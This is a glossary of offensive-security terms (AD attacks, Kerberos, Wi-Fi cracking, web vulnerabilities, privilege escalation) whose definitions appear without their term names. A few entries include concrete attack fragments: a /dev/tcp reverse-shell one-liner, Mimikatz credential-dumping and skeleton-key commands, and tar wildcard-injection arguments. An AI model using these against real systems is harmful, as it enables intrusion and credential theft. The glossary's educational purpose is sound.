definition: An entry in an Access Control List (ACL) that defines specific permissions for a user or group on an object. Modifying ACEs through WriteDACL attacks can lead to privilege escalation.
A list of permissions attached to an object (file, registry key, Active Directory object) specifying which users/groups can perform specific actions.
Microsoft's directory service for Windows domain networks. Stores information about users, computers, groups, and other network resources centrally.
Microsoft's PKI implementation for issuing, managing, and revoking digital certificates in an Active Directory environment. Misconfigurations enable Escalation attacks (ESC1-ESC14).
A suite of wireless security auditing tools that captures WPA handshakes and cracks WEP/WPA-PSK keys through dictionary attacks.
A wireless injection tool used to generate traffic, perform deauthentication attacks, and replay captured packets against wireless networks.
A wireless packet capture tool that shows nearby access points, connected clients, channels, and captures raw 802.11 frames for analysis.
A utility that enables and manages monitor mode on wireless interfaces, allowing capture of all 802.11 frames in range.
A Windows security interface that allows applications to request malware scanning of scripts and content before execution. PowerShell, VBS, and JavaScript are AMSI-aware.
A technique that disables AMSI scanning by modifying the amsiInitFailed field via .NET reflection, allowing malicious PowerShell/scripts to execute without detection.
A protocol that maps IP addresses to MAC addresses on a local network. ARP spoofing/poisoning is used for MITM attacks.
A MITM attack where fake ARP messages associate the attacker's MAC with the gateway's IP, intercepting all local traffic. Performed with tools like arpspoof or Bettercap.
A technique using ARP requests to discover all live hosts on a local subnet quickly. Uses tools like arp-scan or nmap -PR.
An attack targeting Active Directory users with Kerberos pre-authentication disabled. The AS-REP response contains crackable encrypted data (hashcat mode 18200).
The total set of possible entry points (ports, services, APIs, web apps, users, devices) an attacker can target to gain access to a system or network.
A vulnerability that allows an attacker to access protected resources or functionality without providing valid credentials.
A method of bypassing normal authentication to gain persistent access. Includes SSH keys, cron jobs, systemd services, registry Run keys, and Skeleton Key in AD.
A C2 payload type used by Cobalt Strike that communicates with the team server over HTTP, HTTPS, DNS, or SMB for command execution.
An advanced MITM attack framework supporting ARP spoofing, DNS spoofing, HTTPS stripping, credential sniffing, and network reconnaissance with a modular architecture.
An AD attack path mapping tool that visualizes relationships between users, groups, computers, and permissions. Uses graph theory to find shortest paths to Domain Admin.
A Python implementation of SharpHound for collecting Active Directory data from Linux systems. Runs LDAP queries to gather all AD objects and relationships.
An exhaustive password guessing method that systematically tries every possible character combination until the correct password is found.
A vulnerability where a program writes more data to a buffer than it can hold, overwriting adjacent memory. Can lead to code execution or program crashes.
An integrated web application security testing platform featuring intercepting proxy, repeater, intruder, scanner, and decoder tools.
A server controlled by an attacker that sends commands to compromised systems (implants/beacons) and receives exfiltrated data.
Fine-grained privileges assigned to binaries or processes, splitting root privileges into distinct units. Dangerous caps: CAP_SYS_ADMIN, CAP_DAC_OVERRIDE, CAP_SETUID.
A tool that spiders target websites to generate custom wordlists based on their content, useful for targeted password attacks against specific organizations.
A public logging system for TLS certificates that records all issued SSL/TLS certificates. Useful for discovering subdomains and origin IPs bypassing CDNs.
A Python tool for Active Directory Certificate Service enumeration and exploitation. Automates finding ESC1-ESC8 vulnerabilities and requesting compromised certificates.
A fast TCP/UDP tunnel over HTTP for pivoting. Supports reverse SOCKS proxy where the target connects back to the attacker through firewalls.
A wireless security feature preventing direct client-to-client communication. Can be bypassed by routing traffic at layer 3 or exploiting IPv6.
Techniques to find a web server's real IP address behind Cloudflare: MX record analysis, Shodan historical data, certificate transparency logs, and direct subdomain probes.
A vulnerability allowing execution of arbitrary system commands through unsanitized user input passed to shell functions. Severity: Critical.
A publicly available dictionary of standardized identifiers for known security vulnerabilities, maintained by MITRE Corporation.
A post-exploitation tool that automates testing credentials across large Windows/Active Directory networks via SMB, WMI, WinRM, and LDAP.
An attack using username/password pairs from data breaches to access other services, exploiting password reuse across multiple platforms.
A Windows feature that stores saved credentials for network resources, websites, and applications. Dumping Credential Manager reveals stored passwords.
A Linux scheduled task mechanism. Writable cron jobs as root are privilege escalation vectors. Also used for persistence by scheduling reverse shell execution.
A web vulnerability where attackers inject client-side scripts into web pages viewed by other users. Types: Reflected, Stored, DOM-based.
An attack that tricks authenticated users into performing unintended actions on web applications where they're currently logged in.
The part of a Windows security descriptor that lists ACEs granting or denying access permissions to users and groups for an object.
An AD attack using the Directory Replication Service (DRS) protocol to request password hashes from a Domain Controller. Performed with secretsdump.py.
A wireless attack that sends forged deauth frames to disconnect clients from an AP. Used to capture WPA handshakes. Performed with aireplay-ng -0.
A password cracking method using a predefined wordlist (e.g., rockyou.txt) rather than exhaustive combination generation. Fast but limited to known passwords.
A Windows exploitation technique where a malicious DLL is placed in a search path that a legitimate application loads from, achieving code execution.
The process of discovering DNS records (A, AAAA, MX, NS, TXT, CNAME, SOA) for a domain to map its infrastructure. Uses dig, nslookup, or dnsrecon.
An exfiltration technique that encodes data within DNS query and response messages, bypassing network egress filtering since DNS is often allowed through firewalls.
The highest privileged group in Active Directory, with full administrative access to all domain-joined computers and resources.
A documentation generation tool. Its parsing engine has been exploited in path traversal and code execution vulnerabilities.
A set of vulnerabilities in WPA3's SAE/Dragonfly handshake allowing timing side-channel attacks, cache-based attacks, and downgrade attacks to WPA2.
A system with network interfaces on two different networks. In pentesting, a dual-homed host can serve as a pivot point between segmented networks.
A toolkit for performing evil twin attacks against WPA2-Enterprise networks. Captures MSCHAPv2 challenge/response for offline cracking (hashcat -m 5500).
A tool for enumerating information from Windows/Samba systems — users, shares, groups, password policy, OS info via SMB, RPC, and NetBIOS.
A class of attacks against Active Directory Certificate Services. ESC1 (enroll with SAN), ESC8 (NTLM relay to CA), ESC13 (weak certificate policy mapping to Domain Admin).
A rogue wireless access point impersonating a legitimate network's SSID to capture credentials or perform MITM attacks against connecting clients.
A WinRM shell for penetration testing. Supports pass-the-hash, pass-the-ticket, and file upload/download for remote Windows administration during pentests.
The unauthorized transfer of data from a compromised system. Techniques: DNS tunneling, HTTPS to cloud services, ICMP tunneling, steganography, split into small chunks.
A piece of code, data, or sequence of commands that takes advantage of a vulnerability to cause unintended behavior on a target system.
A fast web fuzzer for directory/file brute-force, virtual host discovery, parameter fuzzing, and API endpoint discovery.
A web vulnerability where attackers can include files through unsanitized input. LFI reads local files, RFI includes remote files (can lead to RCE).
A fast ping sweeper that sends ICMP probes in parallel to multiple hosts, useful for quickly discovering live hosts on large subnets.
An attack abusing FTP proxy functionality to scan ports on internal networks through an FTP server, bypassing firewall restrictions.
A tool that fetches known URLs from Wayback Machine, AlienVault OTX, CommonCrawl, and URLScan simultaneously for web reconnaissance.
An impacket tool that requests TGS tickets for service accounts (Kerberoasting). Extracts service account hashes for offline cracking.
A forged Kerberos TGT created with the KRBTGT account's NTLM hash. Grants access to any service in the domain. Persists until KRBTGT is reset twice.
A screenshotting tool written in Go that takes screenshots of web services from a list of URLs for visual web reconnaissance at scale.
Using graphics cards (GPUs) for massively parallel password hash computation. Modern GPUs achieve billions of hashes per second for fast algorithms like NTLM.
A collection of policy settings applied to AD users/computers. Misconfigured GPOs can allow privilege escalation or deployment of malicious software.

The world's fastest password recovery tool supporting GPU acceleration. Supports hundreds of hash modes including NTLM (1000), NTLMv2 (5600), Kerberos (13100, 18200, 19600, 19700, 19800), bcrypt (3200), and SHA-512 (1700).
A tool (hashid, hash-identifier, Name-That-Hash) that identifies the hash algorithm from its format, length, and structure for selecting the correct cracking mode.
A decoy system designed to lure attackers, detect intrusion attempts, and study attacker behavior. Includes SSH, web, database, and wireless honeypots.
The first phase of network scanning that identifies live hosts using ICMP, ARP, or TCP probes before performing detailed port scans on active targets.
A patched version of hostapd that creates rogue APs with a fake RADIUS server to capture WPA2-Enterprise credentials from connecting clients.
A cloud-hosted cybersecurity training platform where users practice penetration testing skills against intentionally vulnerable machines.
A fast online password brute-force tool supporting many protocols (SSH, FTP, HTTP, SMB, RDP, MySQL). Uses -l for username, -P for wordlist.
A covert channel technique using ICMP echo request/reply packets to tunnel data or commands, often allowed through firewalls for ping traffic.
A professional disassembler and debugger used for reverse engineering binaries, analyzing malware, and finding security vulnerabilities in compiled code.
A web vulnerability where an attacker can access objects (files, database records) by manipulating identifiers in requests without proper authorization checks.
A collection of Python classes for SMB, MSRPC, and Kerberos protocol interaction. Key tools: psexec.py, wmiexec.py, secretsdump.py, GetUserSPNs.py, ticketer.py.
A Meterpreter module for token manipulation. Allows listing available tokens, impersonating users, and privilege escalation through token stealing.
A popular PHP CMS. Joomla versions 3.0-3.4 had critical SQL injection vulnerabilities allowing unauthenticated user creation and privilege escalation.
A classic password cracking tool supporting many hash formats. Known for its 'incremental' (brute-force) mode and wordlist-based dictionary attacks.
An AD attack that requests TGS tickets for service accounts (via SPNs) and cracks them offline. The TGS is encrypted with the service account's password hash.
A tool for enumerating Active Directory users via Kerberos pre-authentication. Avoids account lockout since failed Kerberos pre-auth doesn't count against lockout policy.
A network authentication protocol using tickets (TGT, TGS) for secure authentication in Windows domains. Uses symmetric key cryptography and timestamp-based validation.
An exploit targeting the operating system kernel to gain elevated privileges. Example: Dirty COW (CVE-2016-5195), EternalBlue in SMB kernel driver.
A wireless network detector, sniffer, and IDS that works with any Wi-Fi card supporting monitor mode. Captures all 802.11 frames for analysis and intrusion detection.
Techniques used to move from one compromised system to other systems in the network using harvested credentials (PtH, PtT, PSExec, WMI, RDP, SSH).
A protocol for accessing and managing directory services. In AD, LDAP is used for querying user/group/computer objects and their attributes.
A web vulnerability where user input is not sanitized before being used in LDAP queries, allowing attackers to modify LDAP statements.
A Linux environment variable specifying shared libraries to load before all others. Used for privilege escalation when sudo preserves LD_PRELOAD via env_keep.
A Linux privilege escalation auditing script that automatically checks for SUID, capabilities, writable paths, cron jobs, kernel exploits, and configuration weaknesses.
A Windows protocol for name resolution when DNS fails. LLMNR poisoning (via Responder) captures NTLMv2 hashes from victims making broadcast name queries.
Legitimate, signed system binaries that can be abused by attackers for malicious purposes (certutil, mshta, rundll32, regsvr32, bitsadmin, powershell).
A Windows process that enforces security policy and handles authentication. Dumping LSASS memory reveals cached credentials, plaintext passwords, and Kerberos tickets.
A browser-based penetration testing toolkit pre-bundled with security extensions for web application assessment. Now largely replaced by Burp Suite and ZAP.
A password cracking mode (-a 3) that generates candidates based on character sets: ?u (upper), ?l (lower), ?d (digit), ?s (special), ?a (all). Targets known patterns.
The fastest internet-scale port scanner, capable of scanning the entire IPv4 internet in under 5 minutes. Uses asynchronous transmission.
An advanced Metasploit payload that provides in-memory code execution, file system access, token manipulation, keylogging, and pivoting capabilities.
An open-source penetration testing framework featuring exploit development, payload generation, auxiliary modules, post-exploitation modules, and a comprehensive exploit database.
A Windows post-exploitation tool for credential extraction from LSASS memory. Key command: sekurlsa::logonpasswords extracts plaintext passwords, NTLM hashes, and Kerberos tickets.
An attack where the attacker intercepts and potentially modifies communications between two parties. Techniques: ARP spoofing, DNS spoofing, rogue AP, proxy interception.
A challenge-response authentication protocol used in WPA2-Enterprise (PEAP, EAP-TTLS). The challenge/response pair can be cracked offline with hashcat -m 5500.
A versatile networking utility for reading/writing data across TCP/UDP connections. Used for reverse shells, port scanning, banner grabbing, and file transfers.
The successor to CrackMapExec for automating credential testing across SMB, LDAP, WinRM, SSH, and VNC protocols in Active Directory networks.
An open-source web server scanner that tests for outdated software, misconfigurations, dangerous files, and common vulnerabilities across web servers.
The industry-standard network discovery and security scanning tool. Supports dozens of scan types (-sS, -sT, -sU, -sV), NSE scripts, and OS detection.
Nmap's scripting engine with hundreds of scripts for vulnerability detection, service enumeration, protocol fuzzing, and security auditing.
A suite of Microsoft authentication protocols used in Windows networking. NTLMv1/v2 challenge-response is crackable offline. NTLM hash is used in pass-the-hash attacks.
An attack that forwards captured NTLM authentication messages to another server in real-time. Requires SMB signing disabled on the target and admin rights for the relayed user.
An improved NTLM authentication protocol with stronger challenge-response and HMAC-MD5 verification. Crackable offline with hashcat -m 5600.
Information collected from publicly available sources: DNS records, social media, job postings, leaked databases, GitHub repositories, certificate transparency logs.
A collection of OSINT tools and resources categorized by data type (social media, DNS, public records, images) for structured reconnaissance.
A standard awareness document listing the ten most critical web application security risks, updated regularly by the Open Web Application Security Project.
An authentication technique using an NTLM hash (without the plaintext password) to authenticate via SMB, WMI, or WinRM. Uses impacket tools with -hashes flag.
An authentication technique using stolen Kerberos tickets (TGT or TGS) for authentication without a password. Stealthier than PtH since it doesn't touch NTLM.
An attack that tests one common password against many user accounts, staying below the domain lockout threshold to avoid account lockouts.
Microsoft's monthly security update release cycle (second Tuesday). Critical for tracking which vulnerabilities have been patched versus zero-days.
A web vulnerability allowing attackers to access files outside the web root directory by manipulating file paths with ../ sequences.
The malicious code delivered and executed on a compromised system. Types: staged (small stub downloads larger payload), non-staged, shellcode, beacon.
A suite of privilege escalation tools: LinPEAS (Linux), WinPEAS (Windows), and MacPEAS (macOS). Automated detection of common privilege escalation vectors.
A backdoor or access mechanism that survives system reboots. Methods: SSH keys, cron jobs, systemd services, registry Run keys, scheduled tasks, kernel modules.
An attack that coerces a Windows Domain Controller to authenticate to an attacker-controlled server via MS-EFSRPC. Combined with NTLM relay to AD CS for Domain Admin.
A social engineering attack using deceptive emails, messages, or websites to trick users into revealing credentials or installing malware.
A technique to identify live hosts by sending ICMP echo requests (pings) to a range of IP addresses. Performed with nmap -sn, fping, or ping -c 1.
Using a compromised host as a relay point to access otherwise unreachable network segments. Set up with chisel, metasploit autoroute, or SSH port forwarding.
A system managing digital certificates and public-key encryption. AD CS is Microsoft's PKI implementation. Misconfigured PKI enables certificate-based escalation attacks.
A WPA/WPA2 attack extracting the PMKID from the AP's RSN IE without needing a full 4-way handshake. Works without connected clients. Hashcat mode 22000.
The process of probing TCP/UDP ports on a target to determine which services are running. Types: SYN scan, Connect scan, UDP scan, TCP NULL/FIN/Xmas scans.
Actions taken after initial compromise: credential dumping, lateral movement, persistence, privilege escalation, data exfiltration, and evidence covering.
A family of Windows privilege escalation attacks (Hot, Juicy, Sweet, Rogue, PrintSpoofer, GodPotato) exploiting SeImpersonatePrivilege to escalate to SYSTEM.
Microsoft's task automation and configuration management framework. In pentesting, used for AMSI bypass, inline C# execution, and living-off-the-land attacks.
A PowerShell tool for gaining situational awareness in Active Directory. Part of PowerSploit. Enumerates users, groups, sessions, ACLs, and trust relationships.
An initial Kerberos authentication step where the client encrypts a timestamp with their password hash. Disabling pre-auth allows AS-REP roasting attacks.
A Windows service managing print jobs. Exploited in PrintNightmare (RCE via Print Spooler) and PrintSpoofer (SYSTEM escalation via SeImpersonatePrivilege).
A privilege escalation tool exploiting SeImpersonatePrivilege by abusing the Print Spooler service. Works on Windows 10/Server 2016-2019 for SYSTEM shell.
Techniques that inject malicious code into legitimate processes (explorer.exe, svchost.exe) to evade detection. Includes DLL injection, process hollowing, APC injection.
A tool that forces any TCP connection through a proxy chain (SOCKS4/5, HTTP). Used with nmap -sT and other tools for scanning through pivots.
A Sysinternals and impacket tool for executing commands on remote Windows systems via SMB service control manager. Classic lateral movement technique.
A process monitoring tool for Linux that watches /proc to discover cron jobs and scheduled tasks without requiring root privileges.
Precomputed hash chains for fast password hash reversal. Defeated by salting since each unique salt produces a different hash for the same password.
A vulnerability allowing an attacker to execute arbitrary code on a target system from a remote location. The most severe vulnerability class.
A tool that performs WPS brute-force attacks to recover the WPS PIN and the WPA/WPA2 PSK. Pixie Dust (-K flag) dramatically speeds up PIN recovery.
The information gathering phase of a penetration test. Includes passive recon (OSINT, DNS enumeration) and active recon (port scanning, service detection).
An authorized group simulating real-world attacker TTPs against an organization's security controls, people, and processes to improve defenses.
A stealthier DLL injection technique where a DLL loads itself from memory without using the Windows loader, bypassing some detection mechanisms.
A tool for poisoning LLMNR, NBT-NS, and MDNS queries to capture NTLMv2 hashes from Windows machines on a local network for offline cracking.
A shell connection where the compromised system connects back to the attacker's listener. Common payload: bash -i >& /dev/tcp/IP/PORT 0>&1.
A comprehensive guide by Christopher Campbell covering professional penetration testing report writing, including executive summaries, technical findings, and risk ratings.
A large password wordlist containing 14+ million passwords from the 2009 RockYou data breach. The standard wordlist for dictionary-based password attacks.
A C# Kerberos abuse toolkit. Key features: Kerberoasting (kerberoast), AS-REP roasting (asreproast), pass-the-ticket (asktgt ptt), and ticket management.
A password cracking method applying transformation rules (append digits, leet speak, capitalize) to wordlist entries. Hashcat -r best64.rule applies 64 effective mutation rules.
The process of discovering and enumerating Amazon S3 buckets for misconfigurations. Check permissions, object listing, public access, and bucket policies.
Random data added to a password before hashing. Makes rainbow table attacks infeasible by producing unique hashes for identical passwords.
A command-line utility for searching the Exploit-DB archive. Matches exploits and shells against software, version, and service information for exploit selection.
An impacket tool that extracts password hashes via DCSync (remote from DC) or locally from SAM, SYSTEM, and NTDS.dit files.
A Windows privilege allowing a process to debug other processes, including those running as SYSTEM. Required for Mimikatz and LSASS memory dumping.
A Windows privilege allowing a process to impersonate other users' security tokens. Exploited by Potato attacks and PrintSpoofer to escalate to SYSTEM.
A Linux kernel security module providing mandatory access controls (MAC). Can block exploit attempts even with root access if policies are properly configured.
Lightweight, position-independent machine code injected into a process to spawn a shell or execute commands. Written in assembly, encoded to avoid bad characters.
A search engine for internet-connected devices. Filters by port, country, organization, hostname, and service banner for reconnaissance.
A forged Kerberos TGS ticket created with a service account's NTLM hash. Grants access to a specific service. Stealthier than Golden Ticket — doesn't touch the DC.
A persistence technique that patches LSASS on a Domain Controller so any user can authenticate with the skeleton key password (mimikatz: misc::skeleton).
A network file sharing protocol used in Windows networks. SMB relay attacks succeed when SMB signing is disabled. EternalBlue exploited SMBv1 for the WannaCry ransomware.
A security feature that cryptographically signs SMB packets to prevent relay attacks and tampering. When disabled, NTLM relay attacks succeed.
An FTP-like SMB client for accessing Windows file shares from Linux. Useful for checking shares, downloading files, and testing credentials.
An impacket tool for semi-interactive shell execution via SMB service control manager. Creates and removes services for each command to minimize artifacts.
An open-source network intrusion detection/prevention system (IDS/IPS) that analyzes network traffic for malicious patterns using signature-based detection.
A proxy protocol that routes TCP traffic through a tunnel, used for pivoting through compromised hosts. Chisel and Metasploit provide SOCKS proxy functionality.
A web vulnerability allowing attackers to manipulate SQL queries through unsanitized input. Types: UNION-based, Blind (Boolean/Time), Error-based, Out-of-band.
An automated SQL injection detection and exploitation tool that can enumerate databases, extract tables, dump data, and achieve RCE via xp_cmdshell.
Using SSH port forwarding to tunnel traffic. Local (-L), Remote (-R), and Dynamic (-D SOCKS proxy) forwarding for secure pivoting and access.
Cryptographic protocols providing secure communication over networks. TLS 1.2/1.3 are current standards. Weak ciphers and outdated versions (SSL 3.0, TLS 1.0) are attack vectors.
The practice of hiding data within other data (images, audio, video). Used in exfiltration to conceal stolen data within seemingly innocent files.
A Windows application that stores notes in an SQLite database. Often contains plaintext passwords, IP addresses, and sensitive information stored by users.
An Apache web framework for Java. Apache Struts2 had critical RCE vulnerabilities (CVE-2017-5638, CVE-2018-11776) exploited in major data breaches (Equifax).
The process of discovering subdomains for a target domain using passive (certificate transparency, DNS records) and active (DNS brute-force) techniques.
A fast passive subdomain discovery tool using multiple sources (certificate logs, DNS databases, search engines) for comprehensive subdomain enumeration.
A Linux permission bit that allows a binary to execute with the file owner's privileges regardless of who runs it. Misconfigured SUID binaries are an escalation vector.
A stealthy TCP port scan sending SYN packets and analyzing responses. SYN-ACK = open, RST = closed. Does not complete the TCP handshake. Default root scan in nmap.
A Linux init system service file used for persistence. Creating a .service file in /etc/systemd/system/ with a reverse shell payload enables boot persistence.
A Kerberos ticket obtained after initial authentication, used to request service tickets (TGS). Forging a TGT is a Golden Ticket attack.
A Kerberos service that issues TGS tickets. Requesting and cracking TGS tickets is the Kerberoasting attack. Forging is a Silver Ticket.
The process of identifying, analyzing, and prioritizing potential threats to a system. STRIDE (Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation) is a common framework.
Evidence-based knowledge about existing or emerging threats, used to inform defensive decisions. Includes IOC feeds, adversary TTPs, and vulnerability disclosures.
A Windows privilege escalation technique where a process uses another user's security token. Meterpreter incognito module automates token manipulation.
The command-line version of Wireshark for packet capture and analysis without a GUI. Used for scripting network forensic analysis and automated traffic inspection.
An authentication method requiring two or more verification factors. Bypass techniques: session cookie theft, SIM swapping, authentication relay, push notification fatigue.
A Windows security feature that limits applications to standard user privileges unless explicitly elevated. Bypass techniques: DLL hijacking, token duplication, IFileOperation.
The root user ID in Linux/Unix systems. Adding a user to /etc/passwd with UID 0 grants root-equivalent privileges. Exploited when /etc/passwd is writable.
A port scan sending UDP packets to detect open UDP services (DNS 53, SNMP 161, DHCP 67). Slow because open ports don't respond — requires timeout waiting.
A Windows service path vulnerability where spaces in the binary path without quotes allow binary planting for privilege escalation.
The process of discovering different websites hosted on the same IP via host header brute-force. Performed with ffuf, gobuster, or Burp Suite Intruder.
The systematic process of identifying, classifying, and prioritizing vulnerabilities in systems and applications using automated scanners and manual verification.
A platform providing intentionally vulnerable virtual machines for practicing penetration testing skills in a legal environment.
A security solution filtering, monitoring, and blocking malicious HTTP traffic. Bypass techniques: encoding, parameter pollution, HTTP method manipulation, IP rotation.
An outdated wireless security protocol using RC4 with 24-bit IVs. Crackable in minutes using statistical attacks (FMS, PTW) with enough captured packets.
A Hak5 wireless auditing device for automated evil twin, Karma, captive portal credential harvesting, and MITM attacks on wireless networks.
A privilege escalation technique exploiting shell wildcard expansion. Creating files named --checkpoint=1 and --checkpoint-action=exec=shell injects tar arguments.
A Windows privilege escalation auditing script that checks for services, registry keys, token privileges, installed software, and other escalation vectors.
Microsoft's WS-Management protocol implementation for remote system management. Used for lateral movement with tools like evil-winrm.
The world's most popular network protocol analyzer. With a monitor mode interface, it captures and decodes 802.11 frames, decrypts WPA traffic with PSK, and analyzes all protocols.
Microsoft's management infrastructure for remote system administration. Used for lateral movement (wmic, wmiexec.py) and process execution.
The most popular PHP CMS. Common Wordpress attacks: user enumeration, XML-RPC brute-force, vulnerable plugin/theme exploitation, and wp-config.php disclosure.
A wireless security standard using AES-CCMP encryption and 4-way handshake. Vulnerable to PMKID attacks, handshake capture cracking, and KRACK (key reinstallation attack).
The latest wireless security standard using SAE (Simultaneous Authentication of Equals) handshake. Dragonblood vulnerabilities enable side-channel attacks and downgrade attacks.
A simplified wireless network setup standard using an 8-digit PIN. Vulnerable to brute-force and Pixie Dust attacks that recover the PIN and PSK.
A permission that allows modifying an object's DACL (access control list). WriteDACL on a Domain Admin user can lead to full domain compromise.
An open XML-based protocol for instant messaging. Used by some C2 frameworks for covert communication via legitimate chat infrastructure.
A vulnerability where user input is unsafely used in XML path expressions. Can bypass authentication, extract XML document contents, or access forbidden data.
A web vulnerability allowing attackers to read local files, perform SSRF, or cause DoS by injecting malicious XML entities into XML parsers.
An unpatched vulnerability unknown to the vendor. Extremely valuable since no fix exists. Used in APT attacks and sold on exploit markets for high prices.
A DNS replication mechanism between authoritative servers. Misconfigured zone transfers (AXFR) expose the entire DNS record set including internal hosts.
